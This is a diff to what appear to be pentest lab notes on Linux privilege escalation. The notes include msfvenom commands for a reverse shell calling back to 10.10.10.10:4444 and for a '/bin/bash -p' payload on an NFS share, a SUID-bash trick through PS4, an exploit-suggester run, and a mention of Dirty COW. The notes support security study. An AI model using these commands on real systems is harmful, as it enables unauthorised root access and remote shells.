@@ -42,6 +42,10 @@ Other
 
 msfvenom to generate a reverse shell ELF binary: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
 
+generate a payload using msfvenom callnig /bin/bash:
+
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
 <hr class="sep-both">
 
 ## Privilege escalation
@@ -70,3 +74,21 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 => look for mysql, su, sudo...
 
 ssh -i root_key (chmod 600)
+
+---
+
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+
+Check the NFS share configuration on the Debian VM:
+
+cat /etc/exports
+
+----
+
+Kernel exploits can leave the system in an unstable state, last resort.
+
+Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
+
+perl linux-exploit-suggester-2.pl
+
+Linux kernel exploit "Dirty COW"
